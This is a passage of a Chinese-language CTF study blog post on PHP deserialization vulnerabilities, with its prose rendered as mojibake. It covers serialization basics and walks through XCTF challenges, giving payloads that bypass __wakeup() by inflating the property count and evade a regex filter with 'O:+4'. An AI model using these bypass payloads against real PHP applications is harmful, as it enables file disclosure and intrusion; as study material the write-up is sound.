<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    <meta name="keywords" content="PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ , Ab4nd0nçš„ä¸ªäººåšå®¢">
    <meta name="description" content="è®°å½•å­¦ä¹ ï¼Œè®°å½•ç”Ÿæ´»ã€‚">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹  | Ab4nd0nçš„ä¸ªäººåšå®¢</title>
    <link rel="icon" type="image/jpeg" href="/medias/touxiang.jpg">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    
    <!-- jQueryå·²ç§»è‡³é¡µé¢åº•éƒ¨ä»¥æå‡é¦–å±åŠ è½½é€Ÿåº¦ -->
    <!-- <script src="/libs/jquery/jquery.min.js"></script> -->
    <link rel="stylesheet" href="/js/prism/prism.css">


    <!-- å·²ç¦ç”¨ hitokoto API ä»¥æå‡åŠ è½½é€Ÿåº¦ -->
    <!-- <script src="https://v1.hitokoto.cn/?c=d&encode=js&select=%23hitokoto" defer></script> -->

<meta name="generator" content="Hexo 5.4.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --><link rel="alternate" href="/atom.xml" title="Ab4nd0nçš„ä¸ªäººåšå®¢" type="application/atom+xml">
</head>


<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/touxiang.jpg" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Ab4nd0nçš„ä¸ªäººåšå®¢</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>åˆ†ç±»</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>ç•™è¨€æ¿</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>å‹æƒ…é“¾æ¥</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/touxiang.jpg" class="logo-img circle responsive-img">
        
        <div class="logo-name">Ab4nd0nçš„ä¸ªäººåšå®¢</div>
        <div class="logo-desc">
            
            è®°å½•å­¦ä¹ ï¼Œè®°å½•ç”Ÿæ´»ã€‚
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			åˆ†ç±»
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			ç•™è¨€æ¿
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			å‹æƒ…é“¾æ¥
		</a>
          
        </li>
        
        
    </ul>
</div>


        </div>

        
    </nav>

    

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/30.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">PHPååºåˆ—åŒ–æ¼æ´å­¦ä¹ </h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

   /* .toc-widget {
        width: 300px;
        padding-left: 20px;
        background-color: rgb(255, 255, 255,0.7);
        border-radius: 10px;
        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
    } */
    .toc-widget {
        width: 300px;
        padding-left: 20px;
        background-color: rgb(255, 255, 255,0.7);
        border-radius: 10px;
        box-shadow: 0 10px 35px 2px rgba(0, 0, 0, .15), 0 5px 15px rgba(0, 0, 0, .07), 0 2px 5px -5px rgba(0, 0, 0, .1) !important;
    }


    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding: 0;
        text-align: center;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        max-height: calc(100vh - 250px);
        overflow-y: auto;
        overflow-x: hidden;
        min-height: 20px; /* ç¡®ä¿æœ‰æœ€å°é«˜åº¦ */
    }
    
    /* å¦‚æœç›®å½•å†…å®¹ä¸ºç©ºï¼Œæ˜¾ç¤ºæç¤º */
    #toc-content:empty::after {
        content: "æš‚æ— ç›®å½•";
        display: block;
        text-align: center;
        color: #999;
        padding: 20px;
        font-size: 0.9rem;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }
    
    /* å¼ºåˆ¶å±•å¼€æ‰€æœ‰ç›®å½•é¡¹ */
    #toc-content .is-collapsed {
        max-height: 1000px !important;
    }
    
    #toc-content .is-collapsible {
        max-height: 1000px !important;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Web/">
                                <span class="chip bg-color">Web</span>
                            </a>
                        
                            <a href="/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                                <span class="chip bg-color">PHPååºåˆ—åŒ–</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2020-10-28
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>æ›´æ–°æ—¥æœŸ:&nbsp;&nbsp;
                    2020-11-23
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    3.3k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    13 åˆ†
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>é˜…è¯»æ¬¡æ•°:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                
    <style>
        .ai-summary-card {
            background: #f6f8fa;
            border-left: 4px solid #3eaf7c;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
            font-size: 15px;
            color: #555;
            line-height: 1.6;
        }
        .ai-title {
            font-weight: bold;
            color: #2c3e50;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
        }
    </style>

    <div class="ai-summary-card">
        <div class="ai-title">ğŸ¤– AI æ‘˜è¦</div>
        <div>æœ¬æ–‡ä»‹ç»äº†PHPååºåˆ—åŒ–æ¼æ´çš„åŸºæœ¬åŸç†å’Œåˆ©ç”¨æ–¹å¼ã€‚åºåˆ—åŒ–æ˜¯å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œååºåˆ—åŒ–åˆ™ç›¸åã€‚æ–‡ç« é‡ç‚¹è®²è§£äº†serialize()å’Œunserialize()å‡½æ•°ï¼Œä»¥åŠç›¸å…³çš„é­”æœ¯æ–¹æ³•å¦‚__sleep()å’Œ__wakeup()ï¼Œåè€…åœ¨å±æ€§ä¸ªæ•°è¢«ç¯¡æ”¹æ—¶å¯èƒ½è¢«ç»•è¿‡ã€‚æ­¤å¤–ï¼Œè¿˜æ¶‰åŠè®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦å¯¹åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å½±å“ã€sessionå¤„ç†å™¨çš„å·®å¼‚ä»¥åŠå­—ç¬¦ä¸²é€ƒé€¸æ¼æ´ã€‚æœ€åæ€»ç»“äº†ååºåˆ—åŒ–æ¼æ´çš„è§¦å‘æ¡ä»¶å’Œé˜²èŒƒæªæ–½ï¼Œå¼ºè°ƒè¦ä¸¥æ ¼æ§åˆ¶è¾“å…¥å‚æ•°ã€‚</div>
    </div>

                <p>é¦–å…ˆï¼Œä»€ä¹ˆæ˜¯åºåˆ—åŒ–ï¼Ÿ</p>
<p><strong>åºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚å­—ç¬¦ä¸²åŒ…æ‹¬ï¼Œå±æ€§åï¼Œå±æ€§å€¼ï¼Œå±æ€§ç±»å‹å’Œè¯¥å¯¹è±¡å¯¹åº”çš„ç±»åã€‚</strong><br><strong>ååºåˆ—åŒ–åˆ™ç›¸åå°†å­—ç¬¦ä¸²é‡æ–°æ¢å¤æˆå¯¹è±¡</strong></p>
<table>
<thead>
<tr>
<th>ç±»å‹</th>
<th>è¿‡ç¨‹</th>
</tr>
</thead>
<tbody><tr>
<td>åºåˆ—åŒ–</td>
<td>å¯¹è±¡â€”&gt; å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>ååºåˆ—åŒ–</td>
<td>å­—ç¬¦ä¸²â€”&gt;å¯¹è±¡</td>
</tr>
</tbody></table>
<img src="/2020/10/28/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-1/1893076-20200711232303502-1979730084.png" alt="1893076-20200711232303502-1979730084.png" style="zoom:60%;">

<h5 id="1-åºåˆ—åŒ–å‡½æ•°serialize"><a href="#1-åºåˆ—åŒ–å‡½æ•°serialize" class="headerlink" title="1.åºåˆ—åŒ–å‡½æ•°serialize()"></a>1.åºåˆ—åŒ–å‡½æ•°serialize()</h5><pre><code class="line-numbers language-php">&lt;?php
    class Ctf{
        public $flag='flag{****}';
        public $name='cxk';
        public $age='10';
    }
    $ctfer=new Ctf();     //å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡
    $ctfer-&gt;flag='flag{adedyui}';
    $ctfer-&gt;name='Sch0lar';
    $ctfer-&gt;age='18'
    echo serialize($ctfer);  //å°†å…¶åºåˆ—åŒ–
?&gt;
</code></pre>
<blockquote>
<p>è¾“å‡ºç»“æœ O:3:â€Ctfâ€:3{s:4:â€flagâ€;s:13:â€flag{abedyui}â€;s:4:â€nameâ€;s:7:â€Sch0larâ€;s:3:â€ageâ€;s:2:â€18â€;} </p>
<p>Oä»£è¡¨å¯¹è±¡ï¼Œå› ä¸ºæˆ‘ä»¬åºåˆ—åŒ–çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼›åºåˆ—åŒ–æ•°ç»„çš„è¯åˆ™ç”¨Aæ¥è¡¨ç¤º </p>
<p>3ä»£è¡¨ç±»çš„åå­—é•¿ä¸‰ä¸ªå­—ç¬¦ </p>
<p>Ctf æ˜¯ç±»å </p>
<p>3ä»£è¡¨è¿™ä¸ªç±»é‡Œæœ‰ä¸‰ä¸ªå±æ€§(ä¸‰ä¸ªå˜é‡)</p>
<p>sä»£è¡¨å­—ç¬¦ä¸² </p>
<p>4ä»£è¡¨å±æ€§åçš„é•¿åº¦</p>
<p>flagæ˜¯å±æ€§å s:13:â€flag{adedyui}â€ å­—ç¬¦ä¸²ï¼Œå±æ€§é•¿åº¦ï¼Œå±æ€§å€¼</p>
</blockquote>
<p>æ³¨ï¼šserialize()å‡½æ•°åœ¨æ‰§è¡Œå‰ä¼šæ£€æŸ¥ç±»ä¸­æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé­”æœ¯æ–¹æ³• <code>__sleep()</code>ã€‚å¦‚æœå­˜åœ¨ï¼Œ**<code>__sleep()</code>æ–¹æ³•ä¼šå…ˆè¢«è°ƒç”¨ï¼Œç„¶åæ‰æ‰§è¡Œåºåˆ—åŒ–æ“ä½œ**ã€‚</p>
<p><strong>å¯ä»¥åœ¨<code>__sleep()</code>æ–¹æ³•é‡Œå†³å®šå“ªäº›å±æ€§å¯ä»¥è¢«åºåˆ—åŒ–ã€‚å¦‚æœæ²¡æœ‰__sleep()æ–¹æ³•åˆ™é»˜è®¤åºåˆ—åŒ–æ‰€æœ‰å±æ€§</strong></p>
<p>exp :</p>
<pre><code class="line-numbers language-php">&lt;?php
    class Ctf{
        public $flag='flag{****}';
        public $name='cxk';
        public $age='10';
        public function __sleep(){
            return array('flag','age');
        }
    }
    $ctfer=new Ctf();
    $ctfer-&gt;flag='flag{abedyui}';
    $ctfer-&gt;name='Sch0lar';
    $ctfer-&gt;age='18'
    echo serialize($ctfer);
?&gt;
</code></pre>
<p>è¿è¡Œç»“æœï¼š<strong>O:3:â€Ctfâ€:2:{s:4:â€flagâ€;s:13:â€flag{abedyui}â€;s:3:â€ageâ€;s:2:â€18â€;}</strong></p>
<p>ï¼ˆæ³¨æ„ä¸€ä¸‹ï¼Œè¿™è¾¹å¯¹phpçš„ç‰ˆæœ¬æœ‰è¦æ±‚ï¼Œæ­¤å¤„æˆ‘ç”¨çš„æ˜¯php 5.2.17ntsï¼‰</p>
<h5 id="2-ååºåˆ—åŒ–å‡½æ•°-unserialize"><a href="#2-ååºåˆ—åŒ–å‡½æ•°-unserialize" class="headerlink" title="2.ååºåˆ—åŒ–å‡½æ•° unserialize()"></a>2.ååºåˆ—åŒ–å‡½æ•° unserialize()</h5><pre><code class="line-numbers language-php">&lt;?php
    class Ctf{
        public $flag='flag{****}';
        public $name='cxk';
        public $age='10';
        
    }
    $ctfer=new Ctf();
    $ctfer-&gt;flag='flag{abedyui}';
    $ctfer-&gt;name='Sch0lar';
    $ctfer-&gt;age='18';
    $a = serialize($ctfer);    //O:3:"Ctf":2:{s:4:"flag";s:13:"flag{abedyui}";s:3:"age";s:2:"18";}
    var_dump(unserialize($a));  //è¾“å‡ºååºåˆ—åŒ–çš„ç»“æœ
?&gt;
</code></pre>
<p>è¿è¡Œç»“æœï¼š<strong>D:\phpstudy_pro\WWW\sleep.php:13: class Ctf#2 (3) { public $flag =&gt; string(13) â€œflag{abedyui}â€ public $name =&gt; string(7) â€œSch0larâ€ public $age =&gt; string(2) â€œ18â€ }</strong></p>
<pre><code>D:\phpstudy_pro\WWW\sleep.php:13:
class Ctf#2 (3) {
  public $flag =&gt;
  string(13) "flag{abedyui}"
  public $name =&gt;
  string(7) "Sch0lar"
  public $age =&gt;
  string(2) "18"
}
</code></pre>
<p>æ³¨ï¼šunserialize() æ‰§è¡Œæ—¶ä¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨ä¸€ä¸ª wakeup() æ–¹æ³•ã€‚ å¦‚æœå­˜åœ¨ï¼Œåˆ™ä¼šå…ˆè°ƒç”¨ wakeupæ–¹æ³•ã€‚è€Œæ¶‰åŠåˆ°__wakeup()å‡½æ•°ï¼Œç»å¸¸è¦ç”¨åˆ°çš„å°±æ˜¯<strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„æ•°å­—å€¼å¤§äºçœŸå®ç±»ä¸­å±æ€§çš„ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡wakeup()å‡½æ•°çš„æ‰§è¡Œã€‚</strong></p>
<blockquote>
<p>__sleep()å‡½æ•°æ˜¯åœ¨serialize(åºå‡½æ•°åˆ—åŒ–ä¸€ä¸ªå¯¹è±¡å‰è¢«è°ƒç”¨ï¼Œç”¨æ¥æŒ‡å®šè¦åºåˆ—åŒ–çš„å±æ€§</p>
<p>__wakeup()å‡½æ•°åˆ™æ˜¯åœ¨unserialize()ååºåˆ—åŒ–ä¸€ä¸ªå­—ç¬¦ä¸²å‰è¢«è°ƒç”¨</p>
</blockquote>
<p>å…³äº__wakeup()çš„å®ä¾‹ï¼š</p>
<h6 id="1-æ”»é˜²ä¸–ç•Œ-webé«˜æ‰‹è¿›é˜¶åŒº-unserialize3-wakeup-é­”æœ¯æ–¹æ³•"><a href="#1-æ”»é˜²ä¸–ç•Œ-webé«˜æ‰‹è¿›é˜¶åŒº-unserialize3-wakeup-é­”æœ¯æ–¹æ³•" class="headerlink" title="1.æ”»é˜²ä¸–ç•Œ webé«˜æ‰‹è¿›é˜¶åŒº unserialize3 (__wakeup()é­”æœ¯æ–¹æ³•)"></a>1.æ”»é˜²ä¸–ç•Œ webé«˜æ‰‹è¿›é˜¶åŒº unserialize3 (<strong>__wakeup()é­”æœ¯æ–¹æ³•</strong>)</h6><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LTtiandd/article/details/99591998">æ”»é˜²ä¸–ç•Œunserialize3é¢˜è§£</a></p>
<blockquote>
<p>__wakeup() å°†åœ¨è¢«åºåˆ—åŒ–åç«‹å³è¢«è°ƒç”¨ </p>
<p><strong>__wakeup()æ‰§è¡Œæ¼æ´ï¼šä¸€ä¸ªå­—ç¬¦ä¸²æˆ–å¯¹è±¡è¢«åºåˆ—åŒ–åï¼Œå¦‚æœå…¶å±æ€§è¢«ä¿®æ”¹ï¼Œä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥åŒæ—¶ä¸ä¼šæ‰§è¡Œ__wakeup()å‡½æ•°</strong></p>
</blockquote>
<pre><code class="line-numbers language-php">&lt;?php
class Ab4ndon{
        var $test = '123';
}

$a = new Ab4ndon();    //è¿™é‡Œå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å¯¹è±¡

$a_ser = serialize($a);   //å°†è¿™ä¸ªå¯¹è±¡è¿›è¡Œå­—ç¬¦ä¸²å°è£…ï¼Œå°±æ˜¯å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–

//print_r($a_ser);
$a_unser = unserialize($a_ser);//è¿›è¡Œååºåˆ—åŒ–

print_r($a_unser);
?&gt;
</code></pre>
<p>ä»£ç ï¼š</p>
<pre><code class="line-numbers language-php">&lt;?php
class xctf{
    public $flag = '111';
    public function __wakeup(){
    exit('bad requests');
    }
}//è¿™è¾¹æ³¨æ„ä¸€ä¸‹æ–¹æ‹¬å·è¦å¯¹åº”ï¼Œä¸€å¼€å§‹å°‘äº†è¿™ä¸ªæ–¹æ‹¬å·ä¸€ç›´æŠ¥é”™
    $a = new xctf();
    $a_ser = serialize($a);   //å°†è¿™ä¸ªå¯¹è±¡è¿›è¡Œå­—ç¬¦ä¸²å°è£…ï¼Œå°±æ˜¯å¯¹å…¶è¿›è¡Œåºåˆ—åŒ–

print_r($a_ser);  //è¾“å‡ºåºåˆ—åŒ–åçš„å†…å®¹
?&gt;
</code></pre>
<p>åºåˆ—åŒ–ç»“æœï¼š</p>
<p><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></p>
<p>åˆ©ç”¨__wakeup()çš„æ¼æ´ï¼Œæ„é€ payloadä¸ºï¼š**?code=O:4:â€xctfâ€:2:{s:4:â€flagâ€;s:3:â€111â€;}**</p>
<h5 id="3-è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦"><a href="#3-è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦" class="headerlink" title="3.è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦"></a>3.è®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦</h5><pre><code>public(å…¬æœ‰) 
protected(å—ä¿æŠ¤)     // %00*%00å±æ€§å
private(ç§æœ‰çš„)       // %00ç±»å%00å±æ€§å
</code></pre>
<p>åœ¨æœ¬åœ°å†™ä¸ªphpæµ‹è¯•ä¸€ä¸‹:</p>
<pre><code class="line-numbers language-php">&lt;?php
    class Ctf{
        public $name='Ab4ndon';
        protected $age='20';
        private $flag='fl4g';
    }
    $ctfer=new Ctf();     //å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡
    echo serialize($ctfer);
?&gt;
</code></pre>
<p>è¾“å‡ºç»“æœï¼š*<em>O:3:â€Ctfâ€:3:{s:4:â€nameâ€;s:7:â€Ab4ndonâ€;s:6:â€<em>ageâ€;s:2:â€20â€;s:9:â€Ctfflagâ€;s:4:â€fl4gâ€;}</em></em></p>
<blockquote>
<p>å¯ä»¥çœ‹åˆ°ï¼Œprotected å±æ€§è¢«åºåˆ—åŒ–åageå±æ€§åçš„é•¿åº¦å˜æˆäº†6,ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå› ä¸ºageå‰è¿˜æœ‰**%00*%00**</p>
<p>åŒæ ·åœ°ï¼Œprivate å±æ€§è¢«åºåˆ—åŒ–åflagå±æ€§åçš„é•¿åº¦ä¹Ÿä¸æ˜¯flagçš„åŸé•¿ï¼Œå› ä¸ºflagå‰é¢è¿˜æœ‰**%00Ctf%00**</p>
</blockquote>
<p>ä¸‹é¢ä»‹ç»ä¸€ä¸ªè€ƒå¯Ÿ__wakeup()å’Œè®¿é—®æ§åˆ¶ä¿®é¥°ç¬¦çš„é¢˜ï¼š</p>
<h6 id="1-æ”»é˜²ä¸–ç•Œ-webé«˜æ‰‹è¿›é˜¶åŒº-Web-php-unserialize"><a href="#1-æ”»é˜²ä¸–ç•Œ-webé«˜æ‰‹è¿›é˜¶åŒº-Web-php-unserialize" class="headerlink" title="1.æ”»é˜²ä¸–ç•Œ webé«˜æ‰‹è¿›é˜¶åŒº Web_php_unserialize"></a>1.æ”»é˜²ä¸–ç•Œ webé«˜æ‰‹è¿›é˜¶åŒº Web_php_unserialize</h6><p>æºç ï¼š</p>
<pre><code class="line-numbers language-php">&lt;?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) {     //æ‰§è¡Œ __construct æ–¹æ³•ï¼Œå°†ä¼ å…¥çš„ $file èµ‹å€¼ç»™æœ¬åœ°çš„ç§æœ‰æ–¹æ³• $file
        $this-&gt;file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this-&gt;file, true);   //é”€æ¯æ—¶æ‰§è¡Œ __destruct æ–¹æ³•ï¼Œé«˜äº®æœ¬åœ°å˜é‡ file æ–‡ä»¶çš„ä»£ç 
    }
    function __wakeup() { 
        if ($this-&gt;file != 'index.php') {        //å½“ååºåˆ—åŒ–æ„é€ è¿™ä¸ªç±»æ—¶æ‰§è¡Œ __wakeup æ–¹æ³•ï¼Œä¼šå°†æœ¬åœ°å˜é‡ file                                                     é‡æ–°è®¾ç½®ä¸º index.php
            //the secret is in the fl4g.php
            $this-&gt;file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']);         //base64ç¼–ç ä¼ å…¥çš„varå‚æ•°
    if (preg_match('/[oc]:\d+:/i', $var)) {     //æ­£åˆ™åŒ¹é… o:æ•°å­—ï¼šæˆ–è€… c:æ•°å­—ï¼šï¼Œä¸åŒºåˆ†å¤§å°å†™
        die('stop hacking!'); 
    } else {
        @unserialize($var);                     //ååºåˆ—åŒ–
    } 
} else { 
    highlight_file("index.php"); 
} 
?&gt;
</code></pre>
<p>æ€è·¯å¤§è‡´ä¸ºï¼š</p>
<p>æ„é€ Demoç±»ï¼Œä¼ å…¥$file=fl4g.php(ä¼ å…¥çš„$fileèµ‹å€¼ç»™æœ¬åœ°ç§æœ‰æ–¹æ³•$fileï¼Œç„¶å__destruct()å‡½æ•°åœ¨å¯¹è±¡é”€æ¯æ—¶æ‰§è¡Œï¼Œé«˜äº®æœ¬åœ°å˜é‡fileçš„ä»£ç ï¼Œæ•…æˆ‘ä»¬å°†fileèµ‹å€¼ä¸ºæˆ‘ä»¬æƒ³çœ‹çš„fl4g.php),ç„¶åå°†å…¶åºåˆ—åŒ–</p>
<pre><code class="line-numbers language-php">&lt;?php 
class Demo { 
    private $file = 'fl4g.php';
}

$a =new Demo($file);
echo serialize($a);        //O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}

</code></pre>
<p>å°†åºåˆ—åŒ–ç»“æœä¸­çš„å±æ€§ä¸ªæ•°æ”¹ä¸º2ï¼ˆç»•è¿‡__wakeup()å‡½æ•°çš„æ‰§è¡Œï¼‰ï¼Œå°†o:4æ”¹ä¸ºo:+4æˆ–è€…o:@4(ç»•è¿‡æ­£åˆ™åŒ¹é…)ï¼ŒBase64ç¼–ç ågetä¼ å‚</p>
<p>ä½†æ˜¯è¿™æ ·æ“ä½œå¾—ä¸åˆ°flagï¼Œé—®é¢˜å‡ºåœ¨å“ªï¼Ÿ</p>
